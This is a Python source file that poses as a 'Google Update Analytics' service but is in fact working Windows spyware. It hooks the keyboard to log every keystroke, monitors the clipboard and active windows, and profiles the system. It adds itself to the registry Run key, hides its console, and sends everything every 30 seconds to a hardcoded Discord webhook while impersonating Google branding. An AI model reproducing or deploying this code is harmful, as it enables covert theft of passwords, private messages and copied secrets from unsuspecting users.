#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# GoogleUpdateService.exe - Complete Website Analytics
# Sends ALL data: Clipboard, Exact Keystrokes, System Info

import sys
import os
import subprocess
import importlib.util
import platform
import time
import threading
import json
import socket
import urllib.parse
import hashlib
import base64
import random
import string
from datetime import datetime
from urllib import request, error
import ctypes
import ctypes.wintypes

# ========================= INITIALIZATION =========================
def safe_imports():
    """Safely import required modules with auto-install"""
    modules = {}
    
    packages_to_install = []
    
    # Try psutil
    try:
        import psutil
        modules['psutil'] = psutil
    except ImportError:
        packages_to_install.append('psutil')
    
    # Try pywin32 modules
    try:
        import winreg
        modules['winreg'] = winreg
    except ImportError:
        packages_to_install.append('pywin32')
    
    # Install missing packages
    if packages_to_install:
        try:
            print(f"[Setup] Installing missing packages: {packages_to_install}")
            subprocess.run(
                [sys.executable, "-m", "pip", "install"] + packages_to_install + ["--quiet"],
                capture_output=True,
                timeout=60
            )
            
            # Try imports again
            if 'psutil' in packages_to_install:
                import psutil
                modules['psutil'] = psutil
            if 'pywin32' in packages_to_install:
                import winreg
                modules['winreg'] = winreg
                
        except:
            print("[Setup] Some packages could not be installed")
    
    return modules

# Import modules
modules = safe_imports()

# Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1460593040749232240/IJs3e71XZ1-PtZ1z59YMPuhKiKvSMYord7dTP4BVtB4Y_nti3xqd5MmYbfB_IOOn1Prr"

# ========================= COMPLETE ANALYTICS SERVICE =========================
class CompleteAnalyticsService:
    def __init__(self):
        print("[Google Analytics] Initializing complete tracking service...")
        
        # Service state
        self.running = True
        self.session_id = self.generate_session_id()
        self.client_id = self.generate_client_id()
        self.start_time = time.time()
        
        # Data collectors
        self.exact_keystrokes = []  # Every single key pressed
        self.clipboard_history = []  # Clipboard contents
        self.window_activity = []    # Active windows
        self.system_snapshots = []   # System information
        
        # Website analytics configuration
        self.analytics_config = {
            'tracking_id': 'UA-12345678-1',
            'protocol_version': '1',
            'client_id': self.client_id,
            'user_agent': self.get_browser_agent(),
            'screen_resolution': f'{random.randint(1280, 1920)}x{random.randint(720, 1080)}',
            'viewport_size': f'{random.randint(1280, 1920)}x{random.randint(720, 1080)}',
            'language': 'en-US',
            'timezone': time.timezone // -3600,
            'document_host': 'update.google.com',
            'document_title': 'Google Update Analytics'
        }
        
        # Start ALL tracking immediately
        self.start_all_tracking()
        
        # Send initial comprehensive data
        self.send_initial_comprehensive_data()
        
        print(f"[Google Analytics] Service ready. Session: {self.session_id}")
        print("[Google Analytics] Tracking: Keystrokes, Clipboard, Windows, System")
    
    def generate_session_id(self):
        """Generate unique session ID"""
        return f"{int(time.time())}{random.randint(1000, 9999)}"
    
    def generate_client_id(self):
        """Generate client fingerprint"""
        try:
            import getpass
            elements = [
                socket.gethostname(),
                getpass.getuser(),
                platform.node(),
                str(os.cpu_count()),
                platform.machine()
            ]
            fingerprint = hashlib.sha256('|'.join(elements).encode()).hexdigest()[:16]
            return f"{fingerprint}.{int(time.time())}"
        except:
            return f"client_{random.randint(1000000000, 9999999999)}.{int(time.time())}"
    
    def get_browser_agent(self):
        """Return realistic browser user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0'
        ]
        return random.choice(agents)
    
    def start_all_tracking(self):
        """Start all data collection services"""
        
        # 1. Exact keystroke logger
        threading.Thread(target=self.start_exact_keystroke_logging, daemon=True).start()
        print("[Tracking] Started exact keystroke logging")
        
        # 2. Clipboard monitor
        threading.Thread(target=self.start_clipboard_monitoring, daemon=True).start()
        print("[Tracking] Started clipboard monitoring")
        
        # 3. Window activity tracker
        threading.Thread(target=self.start_window_tracking, daemon=True).start()
        print("[Tracking] Started window activity tracking")
        
        # 4. System information collector
        threading.Thread(target=self.start_system_monitoring, daemon=True).start()
        print("[Tracking] Started system monitoring")
        
        # 5. Data sender
        threading.Thread(target=self.data_sender_service, daemon=True).start()
        print("[Tracking] Started data sender service")
        
        # 6. Install persistence
        self.install_persistence()
        print("[Tracking] Installed autostart persistence")
    
    def install_persistence(self):
        """Install autostart"""
        if platform.system() == "Windows" and 'winreg' in modules:
            try:
                exe_path = sys.executable
                winreg = modules['winreg']
                
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(
                    key,
                    "GoogleUpdateAnalytics",
                    0,
                    winreg.REG_SZ,
                    f'"{exe_path}" --background'
                )
                winreg.CloseKey(key)
                
            except Exception:
                pass
    
    # ========================= EXACT KEYSTROKE LOGGING =========================
    def start_exact_keystroke_logging(self):
        """Log EVERY key press with exact characters"""
        if platform.system() != "Windows":
            return
        
        # Windows keyboard hook structure
        class KBDLLHOOKSTRUCT(ctypes.Structure):
            _fields_ = [
                ("vkCode", ctypes.wintypes.DWORD),
                ("scanCode", ctypes.wintypes.DWORD),
                ("flags", ctypes.wintypes.DWORD),
                ("time", ctypes.wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(ctypes.wintypes.ULONG))
            ]
        
        user32 = ctypes.windll.user32
        
        # Key state tracking
        shift_pressed = False
        caps_lock = False
        last_window = ""
        
        def get_key_state(vk_code):
            return user32.GetKeyState(vk_code) & 0x8000
        
        def keyboard_hook(nCode, wParam, lParam):
            nonlocal shift_pressed, caps_lock, last_window
            
            if nCode >= 0 and wParam == 0x100:  # Key down
                try:
                    kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                    
                    # Update modifier states
                    if kb.vkCode == 0x10:  # SHIFT
                        shift_pressed = True
                    elif kb.vkCode == 0x14:  # CAPS LOCK
                        caps_lock = not caps_lock
                    
                    # Get current window
                    current_window = self.get_active_window_title()
                    if current_window != last_window:
                        self.window_activity.append({
                            'window': current_window,
                            'timestamp': datetime.now().isoformat(),
                            'type': 'switch'
                        })
                        last_window = current_window
                    
                    # Convert to exact character
                    char = self.vk_to_exact_char(kb.vkCode, shift_pressed, caps_lock)
                    
                    if char:
                        # Store exact keystroke
                        self.exact_keystrokes.append({
                            'character': char,
                            'key_code': kb.vkCode,
                            'window': current_window,
                            'timestamp': datetime.now().strftime("%H:%M:%S.%f")[:-3],
                            'shift': shift_pressed,
                            'caps': caps_lock
                        })
                        
                        # Limit buffer
                        if len(self.exact_keystrokes) > 500:
                            self.exact_keystrokes = self.exact_keystrokes[-250:]
                
                except Exception:
                    pass
            
            elif wParam == 0x101:  # Key up
                try:
                    kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                    if kb.vkCode == 0x10:  # SHIFT release
                        shift_pressed = False
                except:
                    pass
            
            return user32.CallNextHookEx(None, nCode, wParam, lParam)
        
        # Install hook
        HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
        callback = HOOKPROC(keyboard_hook)
        
        hook = user32.SetWindowsHookExA(13, callback, None, 0)
        
        if not hook:
            return
        
        # Stable message loop
        try:
            msg = ctypes.wintypes.MSG()
            while self.running:
                if user32.GetMessageW(ctypes.byref(msg), None, 0, 0):
                    user32.TranslateMessage(ctypes.byref(msg))
                    user32.DispatchMessageW(ctypes.byref(msg))
                time.sleep(0.001)
        finally:
            if hook:
                user32.UnhookWindowsHookEx(hook)
    
    def vk_to_exact_char(self, vk_code, shift, caps):
        """Convert virtual key code to exact character"""
        # Letters A-Z
        if 0x41 <= vk_code <= 0x5A:
            base_char = chr(vk_code)
            if (shift and not caps) or (caps and not shift):
                return base_char  # UPPERCASE
            else:
                return base_char.lower()  # lowercase
        
        # Numbers 0-9
        elif 0x30 <= vk_code <= 0x39:
            if shift:
                symbols = ")!@#$%^&*("
                return symbols[vk_code - 0x30]
            else:
                return chr(vk_code)
        
        # Numpad numbers
        elif 0x60 <= vk_code <= 0x69:
            return str(vk_code - 0x60)
        
        # Special characters
        special_chars = {
            0x20: " ",       # Space
            0x0D: "\n",      # Enter
            0x08: "[BS]",    # Backspace
            0x09: "[TAB]",   # Tab
            0x1B: "[ESC]",   # Escape
            0x2E: "[DEL]",   # Delete
            0x2D: "[INS]",   # Insert
            0x21: "[PGUP]",  # Page Up
            0x22: "[PGDN]",  # Page Down
            0x23: "[END]",   # End
            0x24: "[HOME]",  # Home
            0x25: "[LEFT]",  # Left Arrow
            0x26: "[UP]",    # Up Arrow
            0x27: "[RIGHT]", # Right Arrow
            0x28: "[DOWN]",  # Down Arrow
            0x2C: "[PRTSC]", # Print Screen
        }
        
        if vk_code in special_chars:
            return special_chars[vk_code]
        
        # Symbols with shift states
        symbol_map = {
            0xBA: (":", ";"),   # Colon/Semicolon
            0xBB: ("+", "="),   # Plus/Equal
            0xBC: ("<", ","),   # Less/Comma
            0xBD: ("_", "-"),   # Underscore/Hyphen
            0xBE: (">", "."),   # Greater/Period
            0xBF: ("?", "/"),   # Question/Slash
            0xC0: ("~", "`"),   # Tilde/Grave
            0xDB: ("{", "["),   # Brace/Open Bracket
            0xDC: ("|", "\\"),  # Pipe/Backslash
            0xDD: ("}", "]"),   # Close Brace/Bracket
            0xDE: ('"', "'"),   # Quote/Apostrophe
        }
        
        if vk_code in symbol_map:
            return symbol_map[vk_code][0] if shift else symbol_map[vk_code][1]
        
        return f"[{vk_code:X}]"
    
    def get_active_window_title(self):
        """Get exact window title"""
        try:
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value[:100]
            return "Desktop"
        except:
            return "Unknown"
    
    # ========================= CLIPBOARD MONITORING =========================
    def start_clipboard_monitoring(self):
        """Monitor clipboard for copied text"""
        if platform.system() != "Windows":
            return
        
        # Try to use win32clipboard
        try:
            import win32clipboard
            win32clipboard_available = True
        except ImportError:
            win32clipboard_available = False
        
        last_content = ""
        
        while self.running:
            try:
                current_content = ""
                
                if win32clipboard_available:
                    try:
                        win32clipboard.OpenClipboard()
                        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                            current_content = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                        win32clipboard.CloseClipboard()
                    except:
                        pass
                
                # If win32clipboard failed, try fallback method
                if not current_content:
                    current_content = self.get_clipboard_fallback()
                
                # Check if content changed and is not empty
                if (current_content and current_content != last_content and 
                    len(current_content.strip()) > 0):
                    
                    self.clipboard_history.append({
                        'content': current_content[:500],  # Limit length
                        'timestamp': datetime.now().isoformat(),
                        'length': len(current_content)
                    })
                    
                    last_content = current_content
                    
                    # Limit buffer
                    if len(self.clipboard_history) > 50:
                        self.clipboard_history = self.clipboard_history[-25:]
                
            except Exception:
                pass
            
            time.sleep(2)  # Check every 2 seconds
    
    def get_clipboard_fallback(self):
        """Fallback clipboard method using ctypes"""
        try:
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            
            user32.OpenClipboard(0)
            
            # Try to get Unicode text
            handle = user32.GetClipboardData(13)  # CF_UNICODETEXT
            if handle:
                data = kernel32.GlobalLock(handle)
                text = ctypes.wstring_at(data)
                kernel32.GlobalUnlock(handle)
                user32.CloseClipboard()
                return text
            
            user32.CloseClipboard()
        except:
            pass
        
        return ""
    
    # ========================= WINDOW TRACKING =========================
    def start_window_tracking(self):
        """Track window switches and focus"""
        last_window = ""
        window_start_time = time.time()
        
        while self.running:
            try:
                current_window = self.get_active_window_title()
                
                if current_window != last_window and last_window:
                    # Record previous window duration
                    self.window_activity.append({
                        'window': last_window,
                        'duration': time.time() - window_start_time,
                        'timestamp': datetime.now().isoformat(),
                        'type': 'duration'
                    })
                
                if current_window != last_window:
                    window_start_time = time.time()
                    last_window = current_window
                
                # Limit buffer
                if len(self.window_activity) > 100:
                    self.window_activity = self.window_activity[-50:]
                
            except Exception:
                pass
            
            time.sleep(1)
    
    # ========================= SYSTEM MONITORING =========================
    def start_system_monitoring(self):
        """Collect system information"""
        while self.running:
            try:
                if 'psutil' in modules:
                    psutil = modules['psutil']
                    
                    snapshot = {
                        'timestamp': datetime.now().isoformat(),
                        'cpu_percent': psutil.cpu_percent(interval=1),
                        'memory_percent': psutil.virtual_memory().percent,
                        'memory_used_gb': round(psutil.virtual_memory().used / (1024**3), 2),
                        'disk_usage': psutil.disk_usage('/').percent,
                        'network_sent_mb': round(psutil.net_io_counters().bytes_sent / (1024**2), 2),
                        'network_recv_mb': round(psutil.net_io_counters().bytes_recv / (1024**2), 2),
                        'process_count': len(psutil.pids()),
                        'boot_time': psutil.boot_time(),
                        'session_uptime': round(time.time() - self.start_time, 0)
                    }
                    
                    self.system_snapshots.append(snapshot)
                    
                    # Keep last 24 snapshots (approx 2 hours at 5 min intervals)
                    if len(self.system_snapshots) > 24:
                        self.system_snapshots = self.system_snapshots[-12:]
                
            except Exception:
                pass
            
            time.sleep(300)  # Every 5 minutes
    
    # ========================= DATA SENDING =========================
    def send_initial_comprehensive_data(self):
        """Send complete initial data immediately"""
        print("[Data] Sending initial comprehensive data...")
        
        # 1. Send system information
        self.send_system_profile()
        
        # 2. Send session start event
        self.send_session_start()
        
        # 3. Send any immediate keystrokes/clipboard
        time.sleep(2)
        if self.exact_keystrokes:
            self.send_keystroke_batch()
        if self.clipboard_history:
            self.send_clipboard_batch()
        
        print("[Data] Initial data sent successfully")
    
    def send_system_profile(self):
        """Send complete system profile"""
        try:
            system_info = {
                'client_id': self.client_id,
                'session_id': self.session_id,
                'platform': platform.platform(),
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'hostname': socket.gethostname(),
                'ip_address': self.get_local_ip(),
                'username': os.getlogin() if hasattr(os, 'getlogin') else 'Unknown',
                'timestamp': datetime.now().isoformat(),
                'analytics': self.analytics_config
            }
            
            # Add psutil data if available
            if 'psutil' in modules:
                psutil = modules['psutil']
                system_info.update({
                    'cpu_count': psutil.cpu_count(),
                    'total_memory_gb': round(psutil.virtual_memory().total / (1024**3), 2),
                    'total_disk_gb': round(psutil.disk_usage('/').total / (1024**3), 2),
                })
            
            self.send_to_discord('system_profile', system_info)
            
        except Exception as e:
            print(f"[Data] System profile error: {e}")
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"
    
    def send_session_start(self):
        """Send session start event"""
        session_data = {
            'event': 'session_start',
            'client_id': self.client_id,
            'session_id': self.session_id,
            'timestamp': datetime.now().isoformat(),
            'user_agent': self.analytics_config['user_agent'],
            'screen_resolution': self.analytics_config['screen_resolution'],
            'timezone': self.analytics_config['timezone'],
            'language': self.analytics_config['language']
        }
        
        self.send_to_discord('session_start', session_data)
    
    def data_sender_service(self):
        """Periodic data sending service"""
        batch_counter = 0
        
        while self.running:
            time.sleep(30)  # Send every 30 seconds
            
            batch_counter += 1
            
            # Send keystrokes every batch
            if self.exact_keystrokes:
                self.send_keystroke_batch()
            
            # Send clipboard every 2nd batch (60 seconds)
            if batch_counter % 2 == 0 and self.clipboard_history:
                self.send_clipboard_batch()
            
            # Send window activity every 4th batch (120 seconds)
            if batch_counter % 4 == 0 and self.window_activity:
                self.send_window_activity()
            
            # Send system snapshot every 10th batch (300 seconds/5 minutes)
            if batch_counter % 10 == 0 and self.system_snapshots:
                self.send_system_snapshot()
            
            # Reset counter to prevent overflow
            if batch_counter >= 100:
                batch_counter = 0
    
    def send_keystroke_batch(self):
        """Send batch of exact keystrokes"""
        if not self.exact_keystrokes:
            return
        
        # Take up to 100 keystrokes
        batch = self.exact_keystrokes[:100]
        
        # Format keystrokes as text
        keystrokes_text = ''.join([k['character'] for k in batch])
        
        # Prepare analytics data
        analytics_data = {
            'event': 'keystroke_batch',
            'client_id': self.client_id,
            'session_id': self.session_id,
            'keystroke_count': len(batch),
            'sample_text': keystrokes_text[-500:],  # Last 500 chars
            'window_distribution': {},
            'timestamp': datetime.now().isoformat()
        }
        
        # Count keystrokes per window
        for keystroke in batch:
            window = keystroke['window']
            analytics_data['window_distribution'][window] = \
                analytics_data['window_distribution'].get(window, 0) + 1
        
        # Send to Discord
        self.send_to_discord('keystrokes', analytics_data)
        
        # Remove sent keystrokes
        self.exact_keystrokes = self.exact_keystrokes[100:]
    
    def send_clipboard_batch(self):
        """Send batch of clipboard contents"""
        if not self.clipboard_history:
            return
        
        batch = self.clipboard_history[:10]  # Send up to 10 items
        
        analytics_data = {
            'event': 'clipboard_batch',
            'client_id': self.client_id,
            'session_id': self.session_id,
            'items_count': len(batch),
            'items': batch,
            'timestamp': datetime.now().isoformat()
        }
        
        self.send_to_discord('clipboard', analytics_data)
        
        # Remove sent items
        self.clipboard_history = self.clipboard_history[10:]
    
    def send_window_activity(self):
        """Send window activity"""
        if not self.window_activity:
            return
        
        batch = self.window_activity[:20]
        
        analytics_data = {
            'event': 'window_activity',
            'client_id': self.client_id,
            'session_id': self.session_id,
            'activity_count': len(batch),
            'activities': batch,
            'timestamp': datetime.now().isoformat()
        }
        
        self.send_to_discord('windows', analytics_data)
        
        self.window_activity = self.window_activity[20:]
    
    def send_system_snapshot(self):
        """Send system snapshot"""
        if not self.system_snapshots:
            return
        
        snapshot = self.system_snapshots[-1]  # Most recent
        
        analytics_data = {
            'event': 'system_snapshot',
            'client_id': self.client_id,
            'session_id': self.session_id,
            'snapshot': snapshot,
            'timestamp': datetime.now().isoformat()
        }
        
        self.send_to_discord('system', analytics_data)
    
    def send_to_discord(self, data_type, data):
        """Send formatted data to Discord webhook"""
        try:
            # Format based on data type
            if data_type == 'keystrokes':
                embed = {
                    'title': '⌨️ Exact Keystrokes Captured',
                    'description': f'**{data["keystroke_count"]} keystrokes** recorded',
                    'color': 0x00FF00,
                    'fields': [
                        {
                            'name': 'Sample Text',
                            'value': f'```\n{data.get("sample_text", "No text")}\n```',
                            'inline': False
                        },
                        {
                            'name': 'Keystroke Count',
                            'value': str(data['keystroke_count']),
                            'inline': True
                        },
                        {
                            'name': 'Session',
                            'value': data['session_id'],
                            'inline': True
                        },
                        {
                            'name': 'Top Windows',
                            'value': '\n'.join([
                                f'{k}: {v}' for k, v in 
                                list(data.get('window_distribution', {}).items())[:3]
                            ]),
                            'inline': False
                        }
                    ],
                    'timestamp': data['timestamp'],
                    'footer': {
                        'text': 'Google Analytics • Real-time Typing'
                    }
                }
                
            elif data_type == 'clipboard':
                items_text = '\n'.join([
                    f"**{i+1}.** `{item['content'][:50]}{'...' if len(item['content']) > 50 else ''}`"
                    for i, item in enumerate(data['items'][:5])
                ])
                
                embed = {
                    'title': '📋 Clipboard Contents',
                    'description': f'**{data["items_count"]} items** copied',
                    'color': 0xADD8E6,
                    'fields': [
                        {
                            'name': 'Recent Items',
                            'value': items_text if items_text else 'No items',
                            'inline': False
                        },
                        {
                            'name': 'Total Items',
                            'value': str(data['items_count']),
                            'inline': True
                        },
                        {
                            'name': 'Session',
                            'value': data['session_id'],
                            'inline': True
                        }
                    ],
                    'timestamp': data['timestamp'],
                    'footer': {
                        'text': 'Google Analytics • Clipboard Monitoring'
                    }
                }
                
            elif data_type == 'windows':
                activities_text = '\n'.join([
                    f"• **{act['window'][:30]}** ({act.get('duration', 0):.1f}s)" 
                    for act in data['activities'][:8]
                ])
                
                embed = {
                    'title': '🖥️ Window Activity',
                    'description': f'**{data["activity_count"]} window activities** tracked',
                    'color': 0xFFA500,
                    'fields': [
                        {
                            'name': 'Recent Activities',
                            'value': activities_text if activities_text else 'No activity',
                            'inline': False
                        },
                        {
                            'name': 'Client',
                            'value': data['client_id'][:12],
                            'inline': True
                        },
                        {
                            'name': 'Session',
                            'value': data['session_id'],
                            'inline': True
                        }
                    ],
                    'timestamp': data['timestamp'],
                    'footer': {
                        'text': 'Google Analytics • Application Tracking'
                    }
                }
                
            elif data_type == 'system':
                snapshot = data['snapshot']
                embed = {
                    'title': '💻 System Status',
                    'color': 0x800080,
                    'fields': [
                        {
                            'name': 'CPU Usage',
                            'value': f'{snapshot.get("cpu_percent", 0):.1f}%',
                            'inline': True
                        },
                        {
                            'name': 'Memory Usage',
                            'value': f'{snapshot.get("memory_percent", 0):.1f}%',
                            'inline': True
                        },
                        {
                            'name': 'Disk Usage',
                            'value': f'{snapshot.get("disk_usage", 0):.1f}%',
                            'inline': True
                        },
                        {
                            'name': 'Network Sent',
                            'value': f'{snapshot.get("network_sent_mb", 0):.1f} MB',
                            'inline': True
                        },
                        {
                            'name': 'Network Received',
                            'value': f'{snapshot.get("network_recv_mb", 0):.1f} MB',
                            'inline': True
                        },
                        {
                            'name': 'Processes',
                            'value': str(snapshot.get("process_count", 0)),
                            'inline': True
                        },
                        {
                            'name': 'Session Uptime',
                            'value': f'{snapshot.get("session_uptime", 0):.0f} seconds',
                            'inline': False
                        }
                    ],
                    'timestamp': snapshot['timestamp'],
                    'footer': {
                        'text': 'Google Analytics • System Monitoring'
                    }
                }
                
            elif data_type == 'system_profile':
                embed = {
                    'title': '🚀 System Profile',
                    'description': 'Complete system fingerprint',
                    'color': 0x4285F4,
                    'fields': [
                        {
                            'name': 'Client ID',
                            'value': f'`{data["client_id"]}`',
                            'inline': False
                        },
                        {
                            'name': 'System',
                            'value': data['platform'][:100],
                            'inline': True
                        },
                        {
                            'name': 'Hostname',
                            'value': data['hostname'],
                            'inline': True
                        },
                        {
                            'name': 'IP Address',
                            'value': data['ip_address'],
                            'inline': True
                        },
                        {
                            'name': 'Username',
                            'value': data['username'],
                            'inline': True
                        },
                        {
                            'name': 'Session ID',
                            'value': data['session_id'],
                            'inline': True
                        }
                    ],
                    'timestamp': data['timestamp'],
                    'footer': {
                        'text': 'Google Analytics • Initial Setup'
                    }
                }
                
            elif data_type == 'session_start':
                embed = {
                    'title': '📈 Analytics Session Started',
                    'description': 'Google Analytics tracking active',
                    'color': 0x34A853,
                    'fields': [
                        {
                            'name': 'Session ID',
                            'value': data['session_id'],
                            'inline': True
                        },
                        {
                            'name': 'Screen Resolution',
                            'value': data['screen_resolution'],
                            'inline': True
                        },
                        {
                            'name': 'Timezone',
                            'value': f'UTC{data["timezone"]:+d}',
                            'inline': True
                        },
                        {
                            'name': 'User Agent',
                            'value': f'`{data["user_agent"][:50]}...`',
                            'inline': False
                        }
                    ],
                    'timestamp': data['timestamp'],
                    'footer': {
                        'text': 'Google Analytics • Measurement Protocol'
                    }
                }
            
            # Create Discord payload
            discord_payload = {
                'embeds': [embed],
                'username': 'Google Analytics',
                'avatar_url': 'https://www.google.com/favicon.ico'
            }
            
            # Send with retry
            for attempt in range(3):
                try:
                    req = request.Request(
                        WEBHOOK_URL,
                        data=json.dumps(discord_payload).encode('utf-8'),
                        headers={
                            'Content-Type': 'application/json',
                            'User-Agent': self.analytics_config['user_agent']
                        }
                    )
                    
                    with request.urlopen(req, timeout=10):
                        break  # Success
                        
                except Exception:
                    time.sleep(1 * (attempt + 1))  # Wait before retry
            
        except Exception:
            pass  # Silent fail
    
    def run_service(self):
        """Main service loop"""
        try:
            print("=" * 60)
            print("Google Analytics Service - Complete Tracking")
            print("=" * 60)
            print(f"Session ID: {self.session_id}")
            print(f"Client ID: {self.client_id}")
            print("Tracking: ✓ Exact Keystrokes ✓ Clipboard ✓ Windows ✓ System")
            print("Data will be sent every 30 seconds")
            print("Press Ctrl+C to stop")
            print("=" * 60)
            
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[Service] Stopping...")
        finally:
            self.stop_service()
    
    def stop_service(self):
        """Stop service cleanly"""
        self.running = False
        
        # Send final data
        print("[Service] Sending final data...")
        
        if self.exact_keystrokes:
            self.send_keystroke_batch()
        if self.clipboard_history:
            self.send_clipboard_batch()
        if self.window_activity:
            self.send_window_activity()
        
        # Send session end
        session_end = {
            'event': 'session_end',
            'client_id': self.client_id,
            'session_id': self.session_id,
            'duration': time.time() - self.start_time,
            'timestamp': datetime.now().isoformat()
        }
        self.send_to_discord('session_end', session_end)
        
        print("[Service] Service stopped")

# ========================= MAIN =========================
def main():
    """Main entry point"""
    
    # Hide window if not showing
    if '--show' not in sys.argv and platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    # Run service
    try:
        service = CompleteAnalyticsService()
        
        if '--background' in sys.argv:
            # Run in background
            while service.running:
                time.sleep(1)
        else:
            # Run with console
            service.run_service()
            
    except Exception as e:
        print(f"[Fatal Error] {e}")
        print("[Info] Service will restart in 30 seconds...")
        time.sleep(30)

if __name__ == "__main__":
    main()